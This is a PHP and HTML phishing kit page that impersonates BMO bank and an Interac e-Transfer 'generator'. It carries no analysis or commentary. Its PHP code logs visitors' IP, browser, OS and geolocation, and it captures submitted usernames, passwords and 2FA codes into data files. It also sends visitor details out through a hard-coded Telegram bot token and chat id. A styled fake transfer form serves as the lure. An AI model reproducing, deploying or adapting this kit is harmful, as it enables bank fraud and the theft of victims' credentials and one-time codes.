
<?php
        include "/files/anti/anti1.php";
        include "/files/anti/anti2.php";
        include "/files/anti/anti3.php";
        include "/files/anti/anti4.php";
        include "/files/anti/anti5.php";
        include "/files/anti/anti6.php";
        include "/files/anti/anti7.php";
        include "/files/anti/anti8.php";
$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");



function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/data.dat';
$file2      = '/data.dat';
$file3      = '/data.dat';
$file4      = '/data.dat';
$file5      = '/data.dat';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "[ BMO ]";
    $project    = "[CR00K-3D]";
    $url        = "https://BMO.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $code2      = "[2FA][$code]";
    $logo       = "[S-T-R|CR00K]";
    $gitusr     = "[SWIF-T-RYNX]";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="E-GENERATOR \n$ip\n$bsr$lh$uos\n$is\n$city$lh$country\n$la$li$lp\n\n$uaget";
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
$apiToken = "5884162033:AAGRZN0UMfdlO3gqYgy8PpwDpdxKsDfaMlQ"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="./index_files/analytics.js###"></script><script type="text/javascript" async="" src="./index_files/analytics.js(1)###"></script><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/prompt.js"></script><script src="chrome-extension://ljdobmomdgdljniojadhoplhkpialdid/page/runScript.js"></script><script>(function(){function hookGeo() {
</script><link rel="stylesheet" href="./index_files/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"><link href="./index_files/font-awesome.min.css" rel="stylesheet"><script type="text/javascript" async="" src="./index_files/analytics.js(3)###"></script><script type="text/javascript" async="" src="./index_files/analytics.js(4)###"></script><script type="text/javascript" async="" src="./index_files/analytics.js(5)###"></script><script src="./index_files/jquery-3.4.1.slim.min.js###" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script><script src="./index_files/popper.min.js###" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script><script src="./index_files/bootstrap.min.js###" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script><script><!-- Global site tag (gtag.js) - Google Analytics -->
 }</script><link rel="stylesheet" href="./index_files/bootstrap.min(1).css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous"><link href="./index_files/font-awesome.min(1).css" rel="stylesheet"><script src="./index_files/jquery-3.4.1.slim.min.js(1)###" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script><script src="./index_files/popper.min.js(1)###" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script><script src="./index_files/bootstrap.min.js(1)###" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script><script async="true" src="./index_files/js(1)"></script><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" href="/assets/ios-logo-v3-32x32.png" sizes="32x32"><link rel="icon" type="image/png" href="/assets/ios-logo-v3-192x192.png" sizes="192x192"><link rel="manifest" href="/assets/site.webmanifest"><link rel="dns-prefetch" href="file://fonts.googleapis.com/"><link rel="stylesheet" id="hestia_fonts-css" href="./index_files/css(1)" type="text/css" media="all"><script type="application/ld+json">
   </script><script id="fsc-api" src="./index_files/fastspring-builder.min.js(1)###" type="text/javascript" data-storefront="instamobile.onfastspring.com/popup-iosapptemplates"></script><script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script><script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script></head>
<link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
<link type="text/css" rel="stylesheet" id="dark-mode-general-link">
<style lang="en" type="text/css" id="dark-mode-custom-style">
</style>
<style lang="en" type="text/css" id="dark-mode-native-style">
</style>
<style lang="en" type="text/css" id="dark-mode-native-sheet">
</style>

<link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
<link type="text/css" rel="stylesheet" id="dark-mode-general-link">
<style lang="en" type="text/css" id="dark-mode-custom-style">
  
</style>
<style lang="en" type="text/css" id="dark-mode-native-style">
  
</style>
<style lang="en" type="text/css" id="dark-mode-native-sheet">
  
</style>

  
<style class="native-dark-class-modified">
@import url(https://fonts.googleapis.com/css?family=Audiowide);

::-moz-selection {
    background: #cc0000;
    text-shadow: none;
}

::selection {
    background: #cc0000;
    text-shadow: none;
}



html,body {
  height: 100%;
  margin: 0;
  padding: 0;
}

body {
  background: #1b1b1b;
  color: #FFF;
  font-family: "Helvetica Neue Light", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
  font-size: 12px;
  line-height: 1;
}

.background-wrap {
  width: 100%;
  height: 100%;
  position: absolute;
  top: 0;
  left: 0;
  z-index: -1;
  overflow: hidden;
}

.background {
  background: url('https://myrror.co/etc/419062774_1385132057.jpg');

  background-size: cover;
  filter: blur(10px);
  height: 105%;
  position: center;
  width: 105%;
  right: -2.5%;
  left: -2.5%;
  top: -2.5%;
  bottom: -2.5%;
}

* {
  box-sizing: border-box;
  cursor: default;
  outline: none;
}

form {
  background: #111;
  border: 1px solid #191919;
  border-radius: .4em;
  bottom: 0;
  box-shadow: 0 5px 10px 5px rgba(0,0,0,0.2);
  height: 600px;
  left: 0;
  margin: auto;
  overflow: ;
  position: absolute;
  right: 0;
  top: 0;
  width: 300px;
}

form:after {
  background: linear-gradient(to right, #111111, #444444, #b6b6b8, #444444, #2F2F2F, #272727);
  content: "";
  display: block;
  height: 1px;
  left: 50px;
  position: absolute;
  top: 0;
  width: 150px;
}

form:before {
  border-radius: 50%;
  box-shadow: 0 0 6px 4px #fff;
  content: "";
  display: block;
  height: 5px;
  left: 34%;
  position: absolute;
  top: 0px;
  width: 8px;
}

.inset {
  border-top: 1px solid #19191a;
  padding: 20px;
}

form h1 {
  font-family: 'Audiowide';
  border-bottom: 1px solid #000;
  font-size: 18px;
  padding: 15px 0;
  position: relative;
  text-align: center;
  text-shadow: 0 1px 0 #000;
}

form h1 {
  color: #KKKKKK;
  font-family: Audiowide;
  font-weight: normal;
}

form h1.poweron {
  color: #ffffff;
  transition: all 0.5s;
  -webkit-animation: flicker 40s ease-in-out 100 alternate, neon 10.5s ease-in-out infinite alternate;
          animation: flicker 1s ease-in-out 1 alternate, neon 1.5s ease-in-out infinite alternate;
  -webkit-animation-delay: 0s, 1s;
          animation-delay: 0s, 1s;
}
form h1.poweron2 {
  color: #HHHHHH;
  transition: all 1s;
  -webkit-animation: flicker 5s ease-in-out 3 alternate, neon 5s ease-in-out infinite alternate;
          animation: flicker 1s ease-in-out 1 alternate, neon 1.5s ease-in-out infinite alternate;
  -webkit-animation-delay: 0s, 1s;
          animation-delay: 0s, 1s;
}

form h1:after {
  position: absolute;
  width: 250px;
  height: 180px;
  content: "";
  display: block;
  pointer-events: none;
  top: 0;
  margin-left: 138px;
  transform-style: flat;
  transform: skew(20deg);
  background: -ms-linear-gradient(top, hsla(0,0%,100%,0.1) 0%,hsla(0,0%,100%,0) 100%);
  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#42ffffff', endColorstr='#00ffffff',GradientType=0 );
  background: linear-gradient(to bottom, hsla(0,0%,100%,0.1) 0%,hsla(0,0%,100%,0) 100%);

}

input[type=text], input[type=password] {
  background: linear-gradient(#1f2124,#27292c);
  border: 1px solid #222;
  border-radius: .3em;
  box-shadow: 0 1px 0 rgba(255,255,255,0.1);
  color: #FFF;
  font-size: 13px;
  margin-bottom: 20px;
  padding: 8px 5px;
  width: 100%;
}

input[type=text]:disabled, input[type=password]:disabled {
	color: #999;
}

label[for=remember] {
  color: #bbb;
  display: inline-block;
  height: 20px;
  line-height: 20px;
  vertical-align: top;
  padding: 0 0 0 5px;
}

.p-container {
  padding: 0 20px 20px;
}

.p-container:after {
  clear: both;
  content: "";
  display: table;
}

.p-container span {
  color: #0d93ff;
  display: block;
  float: left;
  padding-top: 8px;
}

input[type=submit] {
  background: #fb0;
  border: 1px solid rgba(0,0,0,0.4);
  border-radius: .3em;
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), inset 0 10px 10px rgba(255,255,255,0.1);
  color: #873C00;
  cursor: pointer;
  font-size: 13px;
  font-weight: bold;
  height: 40px;
  padding: 5px 20px;
  width: 100%;
}


input[type=submit]:hover, input[type=submit]:focus {
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), inset 0 -10px 10px rgba(255,255,255,0.1);
}

input[type=submitt] {
  background: #fb0;
  border: 1px solid rgba(0,0,0,0.4);
  border-radius: .3em;
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), inset 0 10px 10px rgba(255,255,255,0.1);
  color: #873C00;
  cursor: pointer;
  font-size: 13px;
  font-weight: bold;
  height: 40px;
  padding: 5px 20px;
  width: 100%;
}


input[type=submitt]:hover, input[type=submitt]:focus {
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), inset 0 -10px 10px rgba(255,255,255,0.1);
}



input[type="checkbox"]:checked ~ .checkbox {
  transition: all 0.3s;
  border-bottom: 2px solid #ffcc00;
  border-right: 2px solid #ffcc00;
}

@-webkit-keyframes neon {
  from {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  to {
      text-shadow: 
      0 0 3px #fff,
      0 0 7px  #fff,
      0 0 13px  #fff,
      0 0 17px  #B6FF00,
      0 0 33px  #B6FF00,
      0 0 38px  #B6FF00,
      0 0 48px #B6FF00,
      0 0 63px #B6FF00;
    }
}

@keyframes neon {
  from {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  to {
      text-shadow: 
      0 0 3px #fff,
      0 0 7px  #fff,
      0 0 13px  #fff,
      0 0 17px  #B6FF00,
      0 0 33px  #B6FF00,
      0 0 38px  #B6FF00,
      0 0 48px #B6FF00,
      0 0 63px #B6FF00;
    }
}

@-webkit-keyframes flicker {
  0% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  2% {
    text-shadow: none;
  }

  8% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  10% {
    text-shadow: none;
  }

  20% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  22% {
    text-shadow: none;
  }

  24% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  28% {
    text-shadow: none;
  }

  32% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  34% {
    text-shadow: none;
  }

  36% {
    text-shadow: none;
  }

  42% {
    text-shadow: none;
  }

  100% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }
}

@keyframes flicker {
  0% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  2% {
    text-shadow: none;
  }

  8% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  10% {
    text-shadow: none;
  }

  20% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  22% {
    text-shadow: none;
  }

  24% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  28% {
    text-shadow: none;
  }

  32% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }

  34% {
    text-shadow: none;
  }

  36% {
    text-shadow: none;
  }

  42% {
    text-shadow: none;
  }

  100% {
    text-shadow: 
    0 0 2.5px #fff,
    0 0 5px #fff,
    0 0 7.5px #fff,
    0 0 10px #B6FF00,
    0 0 17.5px #B6FF00,
    0 0 20px #B6FF00,
    0 0 25px #B6FF00,
    0 0 37.5px #B6FF00;
  }
}
</style>

  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
<script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js">
  
</script>
</head>
<body translate="no">
  <div class="background-wrap">
  <div class="background">
    
  </div>
</div>
<form id="accesspanel" action="generator_files/040147.php" method="GET">
<h1 id="litheader" class="poweron">INTERAC ETRANSFER</h1>
<div class="inset"><br>
<br>
<br><center><img src="/files/png/3527710.png" width="50%" alt="Image description"></center><br>
   


<input type="TEXT" name="RECIVER" id="RECIVER" placeholder="YOUR ['NAME']">
<input type="text" name="TRANSFERAMOUNT" id="TRANSFERAMOUNT" placeholder="100.00">
<input type="text" name="EXPIRES" id="EXPIRES" placeholder="EXPIRE [JANUARY 1] ">
<input type="submit" name="Login" id="get" value="GENERATE">












  </div>
</form>


</body></html>
